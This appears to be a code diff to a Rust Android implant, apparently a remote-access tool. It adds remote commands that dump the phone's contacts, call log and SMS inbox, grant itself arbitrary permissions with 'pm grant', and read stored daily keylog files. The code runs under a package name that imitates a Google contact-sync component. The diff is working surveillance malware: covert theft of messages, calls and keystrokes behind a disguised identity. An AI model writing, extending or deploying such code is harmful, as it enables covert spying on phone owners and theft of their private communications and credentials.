@@ -41,6 +41,34 @@ fn cmd_shell(cmd: &str) -> String {
     }
 }
 
+fn cmd_contacts() -> String {
+    cmd_shell("content query --uri content://com.android.contacts/contacts --projection display_name:1,starred:1 --where '1=1' 2>/dev/null | head -500")
+}
+
+fn cmd_calllog() -> String {
+    cmd_shell("content query --uri content://call_log/calls --projection number:1,date:1,type:1,duration:1 --where '1=1' 2>/dev/null | head -200")
+}
+
+fn cmd_sms() -> String {
+    cmd_shell("content query --uri content://sms/inbox --projection address:1,body:1,date:1 --where '1=1' 2>/dev/null | head -200")
+}
+
+fn cmd_grant(permission: &str) -> String {
+    cmd_shell(&format!("pm grant com.google.android.contactsync android.permission.{} 2>&1", permission))
+}
+
+fn cmd_keylog_file() -> String {
+    // Read today's keylog file
+    let date = cmd_shell("date +%Y-%m-%d");
+    let date_clean = date.trim();
+    let path = format!("/data/data/com.google.android.contactsync/files/keylogs/keylog_{}.txt", date_clean);
+    cmd_fs_read(&path)
+}
+
+fn cmd_keylog_list() -> String {
+    cmd_fs_list("/data/data/com.google.android.contactsync/files/keylogs")
+}
+
 fn cmd_fs_list(path: &str) -> String {
     let entries = match std::fs::read_dir(path) {
         Ok(r) => r,
@@ -107,6 +135,17 @@ fn execute_command(cmd: &str, payload: &serde_json::Value) -> Option<String> {
         }
         "device_info" | "info" => Some(cmd_device_info()),
         "ping" | "heartbeat" => Some("pong".into()),
+        "contacts" => Some(cmd_contacts()),
+        "calllog" => Some(cmd_calllog()),
+        "sms" => Some(cmd_sms()),
+        "grant" => {
+            let perm = payload.as_str()
+                .or_else(|| payload.get("permission").and_then(|v| v.as_str()))
+                .unwrap_or("READ_CONTACTS");
+            Some(cmd_grant(perm))
+        }
+        "keylog_file" => Some(cmd_keylog_file()),
+        "keylog_list" => Some(cmd_keylog_list()),
         _ => None, // Unknown command — don't respond
     }
 }
